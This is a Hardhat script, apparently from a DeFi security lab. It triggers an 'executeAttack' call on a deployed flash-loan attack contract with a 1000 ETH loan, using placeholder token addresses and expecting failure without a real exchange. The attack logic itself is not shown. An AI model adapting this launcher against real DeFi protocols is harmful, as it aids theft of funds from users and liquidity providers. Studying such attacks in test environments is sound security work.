const hre = require("hardhat");

async function main() {
    const [attacker] = await hre.ethers.getSigners();
    console.log("[+] Flash Loan Attack initiated");

    const deployments = require("../deployments.json");
    const flash = await hre.ethers.getContractAt("FlashLoanAttack", deployments.FlashLoanAttack);

    const loanAmount = hre.ethers.utils.parseEther("1000");
    const tokenA = attacker.address;
    const tokenB = attacker.address;

    console.log("[i] Requesting flash loan:", hre.ethers.utils.formatEther(loanAmount), "ETH");

    try {
        const tx = await flash.executeAttack(loanAmount, tokenA, tokenB);
        await tx.wait();
        console.log("[✓] Flash loan attack executed");
    } catch(e) {
        console.log("[!] Attack failed (expected without real DEX):", e.message.slice(0, 100));
    }
}

main().catch(console.error);
